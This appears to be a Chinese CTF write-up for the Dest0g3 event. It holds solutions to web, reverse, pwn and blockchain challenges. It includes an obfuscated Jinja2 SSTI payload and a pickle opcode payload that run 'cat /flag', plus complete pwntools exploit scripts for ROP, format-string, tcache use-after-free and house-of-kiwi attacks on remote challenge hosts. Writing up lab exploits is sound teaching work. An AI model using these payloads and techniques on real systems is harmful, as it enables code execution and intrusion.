__class__(config|list()|last()|string()|list()|attr(dict(p=aa,op=bb)|join())(3))*2+dict(cla=aa,ss=bb)|join()+(config|list()|last()|string()|list()|attr(dict(p=aa,op=bb)|join())(3))*2# config.__class__.__init__.__globals__config|attr((config|list()|last()|string()|list()|attr(dict(p=aa,op=bb)|join())(3))*2+dict(cla=aa,ss=bb)|join()+(config|list()|last()|string()|list()|attr(dict(p=aa,op=bb)|join())(3))*2)|attr((config|list()|last()|string()|list()|attr(dict(p=aa,op=bb)|join())(3))*2+dict(in=aa,it=bb)|join()+(config|list()|last()|string()|list()|attr(dict(p=aa,op=bb)|join())(3))*2)|attr((config|list()|last()|string()|list()|attr(dict(p=aa,op=bb)|join())(3))*2+dict(glo=aa,bals=bb)|join()+(config|list()|last()|string()|list()|attr(dict(p=aa,op=bb)|join())(3))*2)#config.__class__.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;cat /flag&#x27;).read()config|attr((config|list()|last()|string()|list()|attr(dict(p=aa,op=bb)|join())(3))*2+dict(cla=aa,ss=bb)|join()+(config|list()|last()|string()|list()|attr(dict(p=aa,op=bb)|join())(3))*2)|attr((config|list()|last()|string()|list()|attr(dict(p=aa,op=bb)|join())(3))*2+dict(in=aa,it=bb)|join()+(config|list()|last()|string()|list()|attr(dict(p=aa,op=bb)|join())(3))*2)|attr((config|list()|last()|string()|list()|attr(dict(p=aa,op=bb)|join())(3))*2+dict(glo=aa,bals=bb)|join()+(config|list()|last()|string()|list()|attr(dict(p=aa,op=bb)|join())(3))*2)|attr((config|list()|last()|string()|list()|attr(dict(p=aa,op=bb)|join())(3))*2+dict(geti=aa,tem=bb)|join()+(config|list()|last()|string()|list()|attr(dict(p=aa,op=bb)|join())(3))*2)(dict(o=aa,s=bb)|join())|attr(dict(po=aa,pen=bb)|join())(dict(c=aa,at=bb)|join()+config|string()|list()|attr(dict(p=aa,op=bb)|join())(7)+config|string()|list()|attr(dict(p=aa,op=bb)|join())(279)+dict(fl=aa,ag=bb)|join())|attr(dict(re=aa,ad=bb)|join())() â€‹ middle 1234567891011121314151617181920212223242526272829303132333435363738394041424344import osimport configfrom flask import Flask, request, session, render_template, url_for,redirect,make_responseimport pickleimport ioimport sysimport base64app = Flask(__name__)class RestrictedUnpickler(pickle.Unpickler): def find_class(self, module, name): if module in [&#x27;config&#x27;] and &quot;__&quot; not in name: return getattr(sys.modules[module], name) raise pickle.UnpicklingError(&quot;global &#x27;%s.%s&#x27; is forbidden&quot; % (module, name))def restricted_loads(s): return RestrictedUnpickler(io.BytesIO(s)).load()@app.route(&#x27;/&#x27;)def show(): base_dir = os.path.dirname(__file__) resp = make_response(open(os.path.join(base_dir, __file__)).read()+open(os.path.join(base_dir, &quot;config/__init__.py&quot;)).read()) resp.headers[&quot;Content-type&quot;] = &quot;text/plain;charset=UTF-8&quot; return resp@app.route(&#x27;/home&#x27;, methods=[&#x27;POST&#x27;, &#x27;GET&#x27;])def home(): data=request.form[&#x27;data&#x27;] User = restricted_loads(base64.b64decode(data)) return str(User)if __name__ == &#x27;__main__&#x27;: app.run(host=&#x27;0.0.0.0&#x27;, debug=True, port=5000)import osdef backdoor(cmd): # è¿™é‡Œæˆ‘ä¹Ÿæ”¹äº†ä¸€ä¸‹ if isinstance(cmd,list) : s=&#x27;&#x27;.join(cmd) print(&quot;!!!!!!!!!!&quot;) s=eval(s) return s else: print(&quot;??????&quot;) flaskæ¡†æ¶ï¼Œç”¨åˆ°pythonååºåˆ—åŒ–ï¼Œå‚è€ƒå·…å³°æå®¢2021 - what_pickleï¼Œé™åˆ¶äº†åŠ è½½çš„æ¨¡å—åªèƒ½ä¸º config é‡Œçš„ï¼Œåå­—ä¸èƒ½æœ‰ __ï¼Œä½†æ˜¯å¯ä»¥é€šè¿‡ config çš„ backdoor(cmd) å‡½æ•°ç»•è¿‡ã€‚ è¿™é¢˜ç®€åŒ–äº† backdoor(cmd) å‡½æ•°çš„ä½¿ç”¨æ¡ä»¶ï¼Œç›´æ¥è°ƒç”¨å³å¯ã€‚åˆ©ç”¨pkeræ„é€ opcodeï¼š 1234b&#x27;&#x27;&#x27;(cconfigbackdoor(S&#x27;__import__(&quot;os&quot;).popen(&quot;cat /flag.txt&quot;).read()&#x27;lo.&#x27;&#x27;&#x27; base64ç¼–ç opcodeï¼Œä¼ å‚ï¼š data=KGNjb25maWcKYmFja2Rvb3IKKFMnX19pbXBvcnRfXygib3MiKS5wb3BlbigiY2F0IC9mbGFnLnR4dCIpLnJlYWQoKScKbG8u â€‹ REVERSEsimpleXOR ç®€å•çš„åŠ å¯† main() ä»£ç ï¼š 12345678910111213141516171819202122232425262728int __cdecl main(int argc, const char **argv, const char **envp)&#123; int v4[72]; // [rsp+0h] [rbp-160h] char v5[52]; // [rsp+120h] [rbp-40h] BYREF int v6; // [rsp+154h] [rbp-Ch] unsigned int j; // [rsp+158h] [rbp-8h] int i; // [rsp+15Ch] [rbp-4h] v6 = 247; printf(&quot;input flag:&quot;); __isoc99_scanf(&quot;%s&quot;, v5); for ( i = 0; i &lt;= 35; ++i ) &#123; v4[i + 36] = v5[i]; v4[i] = v6 ^ (v4[i + 36] + i); &#125; for ( j = 0; j &lt;= 0x23; ++j ) &#123; if ( v4[j] != result_0[j] ) &#123; puts(&quot;Wrong!!!&quot;); return 0; &#125; if ( j == 35 ) puts(&quot;Success!!!&quot;); &#125; return 0;&#125; å…ˆåŠ ä¸‹æ ‡å€¼å†å¼‚æˆ–247ï¼Œæœ€åæ ¡éªŒå¯†æ–‡ï¼Œç®€å•è¿˜åŸï¼š 12345c = [179, 145, 130, 128, 195, 155, 206, 117, 207, 156, 154, 133, 133, 205, 184, 132, 170, 125, 189, 187, 177, 181, 150, 113, 141, 158, 134, 191, 115, 168, 163, 156, 131, 101, 158, 87]flag = [(c[i]^247)-i for i in range(len(c))]print(bytes(flag))# b&#x27;Dest0g3&#123;0bcgf-AdMy892-KobPW-hB6LTqG&#125;&#x27; â€‹ himain() ä»£ç ï¼š 123456789101112131415161718192021222324252627282930int __cdecl main(int argc, const char **argv, const char **envp)&#123; int i; // [rsp+4h] [rbp-ACh] int v1; // [rsp+8h] [rbp-A8h] char enc[45]; // [rsp+10h] [rbp-A0h] char str[100]; // [rsp+40h] [rbp-70h] BYREF unsigned __int64 v8; // [rsp+A8h] [rbp-8h] v8 = __readfsqword(0x28u); memset(str, 0, sizeof(str)); *(_QWORD *)enc = 0x9F8E7A1CC6486497LL; *(_QWORD *)&amp;enc[8] = 0x69EEF382E760BD46LL; *(_QWORD *)&amp;enc[16] = 0xB9C017E2E30EF749LL; *(_QWORD *)&amp;enc[24] = 0x98410148A430392CLL; *(_QWORD *)&amp;enc[32] = 0xE80E7411E5B5A939LL; *(_DWORD *)&amp;enc[40] = 0xA58BFDAC; enc[44] = 109; fwrite(&quot;input: &quot;, 1uLL, 7uLL, stdout); fgets(str, 46, stdin); if ( strlen(str) != 45 ) exit(0); for ( i = 0; i &lt;= 44; ++i ) &#123; v1 = 23 * str[i]; if ( ((unsigned int)((v1 + x[i]) &gt;&gt; 31) &gt;&gt; 24) + (_BYTE)v1 + x[i] - ((unsigned int)((v1 + x[i]) &gt;&gt; 31) &gt;&gt; 24) != enc[i] ) exit(0); &#125; puts(&quot;good!&quot;); return 0;&#125; åŠ å¯†é€»è¾‘ä¸­ ((v1 + x[i]) &gt;&gt; 31) &gt;&gt; 24) äº’å‡æŠµæ¶ˆï¼Œå‰©ä¸‹ 23 * str[i] + x[i] == enc[i]ï¼Œç®€å•è¿˜åŸï¼š 1234567import gmpy2enc = [151, 100, 72, 198, 28, 122, 142, 159, 70, 189, 96, 231, 130, 243, 238, 105, 73, 247, 14, 227, 226, 23, 192, 185, 44, 57, 48, 164, 72, 1, 65, 152, 57, 169, 181, 229, 17, 116, 14, 232, 172, 253, 139, 165, 109]x = [123, 81, 243, 90, 204, 57, 249, 146, 28, 158, 88, 105, 157, 247, 253, 74, 62, 251, 29, 44, 77, 12, 112, 177, 59, 141, 37, 237, 145, 177, 115, 141, 130, 230, 231, 80, 32, 97, 98, 60, 0, 58, 166, 157, 50]flag = [((enc[i]-x[i])*gmpy2.invert(23,256))%256 for i in range(len(enc))]print(bytes(flag))# b&#x27;Dest0g3&#123;f982cd79-d7a3-0874-aa0b-a5b37e4445c8&#125;&#x27; â€‹ EZMATHILSpyæŸ¥çœ‹dllæ–‡ä»¶ï¼Œä¸»è¦é€»è¾‘ä»£ç ï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859private static void &lt;Main&gt;$(string[] args)&#123; Console.Write(&quot;Input your flag:&quot;); string text = Console.ReadLine(); if (!FormatChecker(text)) &#123; err(); &#125; string s = text.Replace(&quot;-&quot;, string.Empty); byte[] second = Checker.Encrypt2(Checker.Encrypt1(Encoding.ASCII.GetBytes(s))); if (new byte[32] &#123; 218, 49, 230, 35, 65, 168, 134, 53, 233, 62, 212, 208, 127, 224, 63, 164, 36, 88, 65, 138, 118, 255, 107, 22, 16, 239, 61, 58, 130, 101, 227, 109 &#125;.SequenceEqual(second)) &#123; Console.WriteLine(&quot;right!&quot;); Console.WriteLine(&quot;Your flag is Dest0g3&#123;&quot; + text + &quot;&#125;&quot;); &#125; else &#123; err(); &#125; static void err() &#123; Console.WriteLine(&quot;err!&quot;); Environment.Exit(1); &#125; static bool FormatChecker(string input) &#123; Guid result; return Guid.TryParse(input, out result); &#125;&#125;public static byte[] Encrypt1(byte[] a)&#123; List&lt;byte&gt; list = new List&lt;byte&gt;(); for (int i = 0; i &lt; 8; i++) &#123; uint value = (uint)((ulong)((long)utils.Unpack32(a[(4 * i)..(4 * (i + 1))]) * 83987L) % 4062393413uL); list.AddRange(BitConverter.GetBytes(value)); &#125; return list.ToArray();&#125;public static byte[] Encrypt2(byte[] a)&#123; List&lt;byte&gt; list = new List&lt;byte&gt;(); for (int i = 0; i &lt; 4; i++) &#123; ulong num = utils.Unpack64(a[(8 * i)..(8 * (i + 1))]); ulong value = num ^ (num &gt;&gt; 25); list.AddRange(BitConverter.GetBytes(value)); &#125; return list.ToArray();&#125; è¾“å…¥å­—ç¬¦ä¸²å…ˆç» Encrypt1() ä»¥32ä½å½¢å¼4ä½ä¸€ç»„åšä¹˜æ³•å–æ¨¡è¿ç®—ï¼Œå†ç» Encrypt2() ä»¥64ä½å½¢å¼8ä½ä¸€ç»„åšxorshiftè¿ç®—ï¼Œé€æ­¥è¿˜åŸï¼š 12345678910111213141516171819202122232425262728293031323334from Crypto.Util.number import *c = [218, 49, 230, 35, 65, 168, 134, 53, 233, 62, 212, 208, 127, 224, 63, 164, 36, 88, 65, 138, 118, 255, 107, 22, 16, 239, 61, 58, 130, 101, 227, 109]c1 = [bytes_to_long(bytes(c[8*i:8*(i+1)])[::-1]) for i in range(4)]def invert_right(m,l): length = 64 mx = (1 &lt;&lt; 64) - 1 i,res = 0,0 while i * l &lt; length: mask = (mx &lt;&lt; (length - l) &amp; mx) &gt;&gt; i * l tmp = m &amp; mask m = m ^ tmp &gt;&gt; l &amp; mx res += tmp i += 1 return resc2 = [invert_right(c1[i], 25) for i in range(4)]c3 = []for i in range(4): c3 += list(long_to_bytes(c2[i]))[::-1]c4 = [bytes_to_long(bytes(c3[4*i:4*(i+1)])[::-1]) for i in range(8)]c4 = [(k*inverse(83987,4062393413))%4062393413 for k in c4]c5 = []for i in range(8): c5 += list(long_to_bytes(c4[i]))[::-1]print(bytes(c5))# b&#x27;28956fc4c54045a8808d42a5fab4b5f8&#x27; â€‹ PWNez_aarchä¸»è¦ä»£ç ï¼š 123456789101112131415161718192021222324int __cdecl main(int argc, const char **argv, const char **envp)&#123; sub_8EC(); func(); return 0;&#125;__int64 func()&#123; puts(&quot;It&#x27;s just a easy stack overflow.&quot;); return fun2();&#125;__int64 fun2()&#123; char buf; // [xsp+10h] [xbp+10h] BYREF puts(&quot;Please leave your name:&quot;); read(0, &amp;buf, 0x30uLL); return puts(&quot;OK, you can exploit it now.&quot;);&#125;__int64 backdoor()&#123; puts(&quot;OK, you get it !&quot;); return system(&quot;/bin/sh&quot;);&#125; armçš„aarch64æ¶æ„ï¼Œå¼€äº†PIEï¼Œä¸åé—¨åœ°å€æ¯”è¾ƒå‘ç°åªæœ‰å1ä¸ªå­—èŠ‚ä¸åŒï¼ŒæŠŠè¿”å›åœ°å€çš„å°¾1å­—èŠ‚æ”¹ä¸ºåé—¨åœ°å€å°¾1å­—èŠ‚ï¼Œç®€å•æ ˆæº¢å‡ºï¼š 12345678from pwn import *r = remote(&#x27;node4.buuoj.cn&#x27;, 26257)r.recvline()r.send(&#x27;a&#x27;*(0x30-0x08) + &#x27;\\x3c&#x27;)r.interactive() â€‹ ez_pwnä¸»è¦ä»£ç ï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859int hackme()&#123; int v1[10]; // [esp+4h] [ebp-44h] BYREF unsigned int v2; // [esp+2Ch] [ebp-1Ch] BYREF int v3; // [esp+30h] [ebp-18h] BYREF unsigned int v4; // [esp+34h] [ebp-14h] unsigned int i; // [esp+38h] [ebp-10h] unsigned int v6; // [esp+3Ch] [ebp-Ch] v6 = 0; v4 = 0; puts(&quot;input the length of array:&quot;); __isoc99_scanf(&quot;%d&quot;, &amp;v2); if ( (int)abs32(v2) &gt; 10 ) &#123; puts(&quot;array is too long!&quot;); exit(0); &#125; while ( 1 ) &#123; while ( 1 ) &#123; puts(&quot;\\n\\n----------------------------------------------------&quot;); puts(&quot;choice:\\n1.add num\\n2.get sum\\n3.get avg\\n4.exit&quot;); puts(&quot;----------------------------------------------------\\n&quot;); puts(&quot;input your choice:&quot;); __isoc99_scanf(&quot;%d&quot;, &amp;v3); if ( v3 != 3 ) break; if ( v4 ) printf(&quot;avg = %d\\n&quot;, v6 / v4); else puts(&quot;no avg!\\n&quot;); &#125; if ( v3 &gt; 3 ) break; if ( v3 == 1 ) &#123; if ( v4 &gt;= v2 ) &#123; puts(&quot;array is too long!&quot;); exit(0); &#125; puts(&quot;input num&quot;); __isoc99_scanf(&quot;%d&quot;, &amp;v1[v4++]); &#125; else &#123; if ( v3 != 2 ) break; v6 = 0; for ( i = 0; v4 &gt; i; ++i ) v6 += v1[i]; printf(&quot;sum = %d\\n&quot;, v6); &#125; &#125; puts(&quot;exit!&quot;); return 0;&#125; å¼€å§‹çš„ scanf å¤„æœªæ£€æŸ¥è¾“å…¥ï¼Œè¯»å…¥è´Ÿæ•°å¯è‡´è´Ÿæº¢å‡ºï¼Œå†ç»“åˆå†™å…¥æ•°æ®çš„ç¬¬äºŒä¸ª scanfï¼Œ å¯ä»¥è¶Šæ ˆä¸€ç›´å†™ï¼Œæœ€ååˆ©ç”¨ROPä¿®æ”¹è¿”å›åœ°å€ï¼Œç¬¬ä¸€æ¬¡ROPæ±‚libcåŸºåœ°å€ï¼Œç¬¬äºŒæ¬¡ROPå¯getshellï¼š 12345678910111213141516171819202122232425262728293031323334353637383940414243444546from pwn import *r = remote(&#x27;node4.buuoj.cn&#x27;, 28547)elf = ELF(&#x27;./ez_pwn&#x27;)def add(n): r.sendlineafter(&#x27;input your choice:&#x27;, &#x27;1&#x27;) r.sendlineafter(&#x27;input num&#x27;, str(n))puts_plt = elf.plt.putsputs_got = elf.got.putshackme_addr = elf.sym.hackmer.recvuntil(&#x27;length of array:&#x27;)r.sendline(&#x27;-2147483648&#x27;)for i in range(10): add(1)add(1000)add(1)add(17)add(puts_plt)add(hackme_addr)add(puts_got)r.sendlineafter(&#x27;input your choice:&#x27;, &#x27;4&#x27;)r.recvuntil(&#x27;exit!\\n&#x27;)puts_addr = u32(r.recv(4))libc_base = puts_addr - 0x67560system_addr = libc_base + 0x3cf10binsh_addr = libc_base + 0x17b9dbr.recvuntil(&#x27;length of array:&#x27;)r.sendline(&#x27;-2147483648&#x27;)for i in range(10): add(1)add(1000)add(1)add(17)add(signed(system_addr))add(hackme_addr)add(signed(binsh_addr))r.sendlineafter(&#x27;input your choice:&#x27;, &#x27;4&#x27;)r.interactive() â€‹ dest_loveä¸»è¦ä»£ç ï¼š 123456789101112131415161718192021222324__int64 __fastcall main(int a1, char **a2, char **a3)&#123; __int64 i; // [rsp+0h] [rbp-10h] setbuf(stdin, 0LL); setbuf(stdout, 0LL); setbuf(stderr, 0LL); for ( i = 0LL; i &lt;= 5; ++i ) &#123; puts(&quot;What about your love to Dest0g3?&quot;); read(0, format, 0x40uLL); printf(format); &#125; if ( dword_4010 == 1314520 ) &#123; puts(&quot;I can feel your love!&quot;); system(&quot;/bin/sh&quot;); &#125; else &#123; puts(&quot;Your dont love Dest0g3 at all!&quot;); &#125; return 0LL;&#125; æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œéœ€è¦æ”¹å†™å€¼çš„ä¸²åœ¨bssæ®µé‡Œã€‚ 123456789101112131415161718192021from pwn import *r = remote(&#x27;node4.buuoj.cn&#x27;,29044)e = ELF(&#x27;./pwn&#x27;)r.sendafter(b&#x27;What about your love to Dest0g3?\\n&#x27;,b&#x27;aaa&#x27;)r.sendafter(b&#x27;What about your love to Dest0g3?\\n&#x27;,b&#x27;aaa&#x27;)r.sendafter(b&#x27;What about your love to Dest0g3?\\n&#x27;,b&#x27;%12$p%10$p&#x27;)base = int(r.recv(14),16) - 0x1185stack = int(r.recv(14),16) - 0xd8print(hex(stack))r.sendafter(b&#x27;What about your love to Dest0g3?\\n&#x27;,&#x27;%&#123;&#125;c%10$hn&#x27;.format(stack % 0x10000))target = base + 0x4010r.sendafter(b&#x27;What about your love to Dest0g3?\\n&#x27;,&#x27;%&#123;&#125;c%39$hn&#x27;.format(target % 0x10000))r.sendafter(b&#x27;What about your love to Dest0g3?\\n&#x27;,&#x27;%1314520c%12$n&#x27;)r.interactive() â€‹ ezuafä¸»è¦ä»£ç ï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)&#123; int v3; // [rsp+Ch] [rbp-114h] sub_11C5(a1, a2, a3); while ( 1 ) &#123; menu(); v3 = read_n(); switch ( v3 ) &#123; case 1: add(); break; case 2: edit(); break; case 3: delete(); break; case 4: show(); break; default: puts(&quot;Invaild Choice!&quot;); break; &#125; &#125;&#125;void delete()&#123; signed int v0; // [rsp+Ch] [rbp-4h] puts(&quot;Please tell me the index: &quot;); v0 = read_n(); if ( *((_QWORD *)&amp;unk_40C0 + v0) &amp;&amp; (unsigned int)v0 &lt;= 0xF ) free(*((void **)&amp;unk_40C0 + v0)); else puts(&quot;Invalid Index!&quot;);&#125; é«˜ç‰ˆæœ¬ï¼ˆ2.33ï¼‰çš„UAFæ¼æ´åˆ©ç”¨ï¼Œåœ¨tcacheé‡Œå†™å…¥__free_hookï¼Œå†å†™å…¥systemã€‚ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758from pwn import *r = remote(&#x27;node4.buuoj.cn&#x27;,26427)libc = ELF(&#x27;./libc-2.33.so&#x27;)def add(size,content): r.sendlineafter(&#x27;4. show\\n: &#x27;,&#x27;1&#x27;) r.sendlineafter(&#x27;Please tell me its size: &#x27;,str(size)) r.sendafter(&#x27;Content: &#x27;,content) def edit(idx,content): r.sendlineafter(&#x27;4. show\\n: &#x27;,&#x27;2&#x27;) r.sendlineafter(&#x27;Please tell me the index: &#x27;,str(idx)) r.sendafter(&#x27;Please tell me its content: &#x27;,content)def delete(idx): r.sendlineafter(&#x27;4. show\\n: &#x27;,&#x27;3&#x27;) r.sendlineafter(&#x27;Please tell me the index: &#x27;,str(idx)) def show(idx): r.sendlineafter(&#x27;4. show\\n: &#x27;,&#x27;4&#x27;) r.sendlineafter(&#x27;Please tell me the index: \\n&#x27;,str(idx))add(0x7f,&#x27;a&#x27;)add(0x40,&#x27;a&#x27;)add(0x40,&#x27;a&#x27;)add(0x50,&#x27;/bin/sh&#x27;)for i in range(7): delete(0) edit(0,p64(0)*2+&#x27;\\n&#x27;) delete(0)show(0)libc_base = u64(r.recv(6).ljust(8,&#x27;\\x00&#x27;))-0x1e0c00#print(hex(libc_base))delete(2)show(2)heap_addr1 = ((u64(r.recv(8)) &lt;&lt; 12) % (2**64)) + 0x380#print(hex(heap_addr1))delete(1)show(1)free_hook = libc_base + libc.sym.__free_hook#print(hex(free_hook))heap_addr2 = (((u64(r.recv(8)) ^ heap_addr1) &lt;&lt; 12) % (2**64)) + 0x330#print(hex(heap_addr2))next = ((heap_addr2 &gt;&gt; 12) % (2**64)) ^ free_hookedit(1,p64(next)+&#x27;\\n&#x27;)add(0x40,&#x27;a&#x27;)system_addr = libc_base + libc.sym.system#print(hex(system_addr))add(0x40,p64(system_addr))delete(3)r.interactive() â€‹ emmaä¸»è¦ä»£ç ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107void __fastcall __noreturn main(const char *a1, char **a2, char **a3)&#123; int v3; // eax init_0(); while ( 1 ) &#123; while ( 1 ) &#123; menu(); read_n(); if ( v3 != 4 ) break; delete(a1, a2); &#125; if ( v3 &gt; 4 ) &#123;LABEL_12: a1 = &quot;Invaild Choice!&quot;; puts(&quot;Invaild Choice!&quot;); &#125; else &#123; switch ( v3 ) &#123; case 3: show(a1, a2); break; case 1: add(a1, a2); break; case 2: edit(a1, a2); break; default: goto LABEL_12; &#125; &#125; &#125;&#125;void add()&#123; int v0; // eax int v1; // eax int v2; // [rsp+0h] [rbp-10h] int v3; // [rsp+4h] [rbp-Ch] void *buf; // [rsp+8h] [rbp-8h] puts(&quot;Index: &quot;); read_n(); v2 = v0; puts(&quot;Size: &quot;); read_n(); v3 = v1; if ( v1 &gt; 1047 &amp;&amp; v1 &lt;= 4096 ) &#123; buf = malloc(v1); puts(&quot;Content&quot;); read(0, buf, v3); qword_4060[v2] = buf; dword_40E0[v2] = v3; &#125;&#125;ssize_t edit()&#123; int v0; // eax ssize_t result; // rax int v2; // [rsp+Ch] [rbp-4h] puts(&quot;Index: &quot;); read_n(); v2 = v0; result = qword_4060[v0]; if ( result ) &#123; puts(&quot;Content&quot;); return read(0, (void *)qword_4060[v2], (int)dword_40E0[v2]); &#125; return result;&#125;int show()&#123; int v0; // eax __int64 v1; // rax int v3; // [rsp+Ch] [rbp-4h] puts(&quot;Index: &quot;); read_n(); v3 = v0; v1 = qword_4060[v0]; if ( v1 ) LODWORD(v1) = puts((const char *)qword_4060[v3]); return v1;&#125;void delete()&#123; int v0; // eax puts(&quot;Index: &quot;); read_n(); if ( *((_QWORD *)&amp;qword_4060 + v0) ) free(*((void **)&amp;qword_4060 + v0));&#125; åŒæ ·æ˜¯é«˜ç‰ˆæœ¬ï¼ˆ2.33ï¼‰çš„UAFï¼Œæœ€å°ç”³è¯·0x417å¤§å°çš„chunkï¼› å…ˆç”¨è´Ÿidxä¿®æ”¹stderræŒ‡é’ˆï¼Œå†åˆ©ç”¨LargeBin Attackä¿®æ”¹__pointer_chk_guardï¼Œä¼ªé€ stderrä¿®æ”¹vtableï¼Œæœ€åæ”¹topchunkè§¦å‘house of kiwiã€‚ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889from pwn import *context(os=&#x27;linux&#x27;,arch=&#x27;amd64&#x27;)context.log_level = &#x27;debug&#x27;r = remote(&#x27;node4.buuoj.cn&#x27;,&#x27;25443&#x27;)elf = ELF(&#x27;./pwn&#x27;) libc = ELF(&#x27;libc-2.33.so&#x27;) def add(idx,size,data): r.sendlineafter(&#x27;&gt;&gt;&#x27;,&#x27;1&#x27;) r.sendlineafter(&#x27;Index:&#x27;,str(idx)) r.sendlineafter(&#x27;Size:&#x27;,str(size)) r.sendlineafter(&#x27;Content&#x27;,data)def edit(idx,data): r.sendlineafter(&#x27;&gt;&gt;&#x27;,&#x27;2&#x27;) r.sendlineafter(&#x27;Index:&#x27;,str(idx)) r.sendafter(&#x27;Content&#x27;,data)def show(idx): r.sendlineafter(&#x27;&gt;&gt;&#x27;,&#x27;3&#x27;) r.sendlineafter(&#x27;Index:&#x27;,str(idx))def delete(idx): r.sendlineafter(&#x27;&gt;&gt;&#x27;,&#x27;4&#x27;) r.sendlineafter(&#x27;Index:&#x27;,str(idx))def ROL(content, key): tmp = bin(content)[2:].rjust(64, &#x27;0&#x27;) return int(tmp[key:] + tmp[:key], 2)add(0,0x460,&#x27;a&#x27;*0x40 + p64(0)*4 + &#x27;cat flag&#x27;)add(1,0x420,&#x27;b&#x27;*0x40)add(2,0x440,&#x27;c&#x27;*0x40)add(3,0x420,&#x27;d&#x27;*0x40)delete(0)edit(0,&#x27;\\x01&#x27;)show(0)libc_base = (u64(r.recvuntil(&#x27;\\x7f&#x27;).ljust(8,&#x27;\\x00&#x27;)) &gt;&gt; 16) - libc.sym.__malloc_hook - 0x71print(hex(libc_base))edit(0,&#x27;\\x00&#x27;)add(4,0x470,&#x27;e&#x27;*0x40)delete(2)edit(0,&#x27;a&#x27;*0x10)show(0)r.recvuntil(&#x27;a&#x27;*0x10)heap_addr = u64(r.recv(6).ljust(8,&#x27;\\x00&#x27;))print(hex(heap_addr))heap_base = heap_addr - 0x290global_max_fast = libc_base + 0x1e3e78stderr_chain = libc_base + 0x1e1648__pointer_chk_guard = libc_base + 0x1ed5b0print(hex(__pointer_chk_guard))edit(0,p64(libc_base+0x1e1000)*2 + p64(heap_addr) + p64(__pointer_chk_guard-0x20) + &#x27;\\n&#x27;)add(5,0x480,&#x27;f&#x27;*0x40) target = libc_base + libc.sym.systemio_cookie_jumps = libc_base + 0x1e1a20fake_IO_FILE = p64(0x00000000fbad2087)+3 * p64(0)fake_IO_FILE += p64(0)fake_IO_FILE += p64(0xffffffffffffffff) fake_IO_FILE += p64(0)fake_IO_FILE += p64(0)fake_IO_FILE += p64(0)fake_IO_FILE += p64(0)*4fake_IO_FILE += p64(0) fake_IO_FILE += p64(0)*3fake_IO_FILE += p64(libc_base + 0x1e3660) fake_IO_FILE += p64(0)*7fake_IO_FILE += p64(0)fake_IO_FILE += p64(0)fake_IO_FILE += p64(io_cookie_jumps + 0x40)fake_IO_FILE += p64(heap_base + 0x300)fake_IO_FILE += p64(0)fake_IO_FILE += p64(ROL(target ^ (heap_base+0xb30),0x11))add(-4,0x500,fake_IO_FILE)add(6,0x700,&#x27;6&#x27;*0x40)delete(6)add(7,0x500,&#x27;7&#x27;*0x40)edit(6,&#x27;a&#x27;*0x508+p64(0x300))add(8,0xff0,&#x27;8&#x27;*0x40)r.interactive() â€‹ BLOCKCHAINWhere the flagï¼Ÿ 123456789contract find&#123; uint96 private a=7855; address private owner=msg.sender; bool private f=false; bool private t=true; string[] private flag=[flag1,flag2];&#125;//https://ropsten.etherscan.io/address/0x78f2b5695e5e6e51fc0fd6d7e0caaa05190af9cc åº”è¯¥æ˜¯éé¢„æœŸï¼Œè®¿é—®urlè¿›å…¥åˆçº¦ï¼Œåœ¨äº¤æ˜“0x2a00af3b2a2a939c491359e7960cbcbda6bdb4d45294fbb8d857100cbfb700e1çš„InputDataé‡Œï¼Œå¯ä»¥æŸ¥çœ‹åˆ°Hexæ•°æ®ï¼Œè½¬å­—ç¬¦ä¸²å¯å¾—åˆ°flagä¸¤æˆªå­—ç¬¦ä¸²ï¼šDest0g3&#123;0n1y_u5e_priv4t3_iï¼Œ5_n0t_s4f3_1n_B1okCh4in!&#125;ã€‚ â€‹ Easy predict 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576contract storageplace&#123; mapping(uint=&gt;string)private _flag; address owner; constructor()public&#123; owner=msg.sender; &#125; function flag() public view returns(string memory) &#123; require(msg.sender==owner); &#125; function buy(uint number) public returns(bytes1)&#123; require(msg.sender==owner); &#125;&#125;contract question&#123; mapping(address=&gt;bool)public regeister; mapping(address=&gt;uint)private seed; uint constant Price_Per_Char=10 ether; address owner; storageplace immutable Flag; constructor() public &#123; owner=msg.sender; storageplace _Flag = new storageplace(); Flag = _Flag; &#125; modifier isowner()&#123; require(msg.sender==owner,&quot;I think you are not the rignt person&quot;); _; &#125; function addRight(address tar)public isowner&#123; regeister[tar]=true; &#125; function removeRight(address tar)public isowner&#123; regeister[tar]=false; &#125; function regeist() public &#123; require(regeister[msg.sender]==false); regeister[msg.sender]=true; seed[msg.sender]=block.number+1; &#125; function buyflag(uint want) public payable returns(bytes1)&#123; require(msg.value==Price_Per_Char,&quot;is not free&quot;); return Flag.buy(want); &#125; function query(bytes32 answer) public view returns(string memory) &#123; require(regeister[msg.sender]); require(block.number &gt;seed[msg.sender],&quot;too early&quot;); bytes32 result = blockhash(seed[msg.sender]); require(answer==result,&quot;wrong answer&quot;); return Flag.flag(); &#125; function withdraw() public payable&#123; require(msg.sender==owner); msg.sender.transfer(address(this).balance); &#125;&#125;https://ropsten.etherscan.io/tx/0xd994796e78b5f5ff0d0f0738c29dbce8db0e8b32132cd0e6a10b24fa79b48925 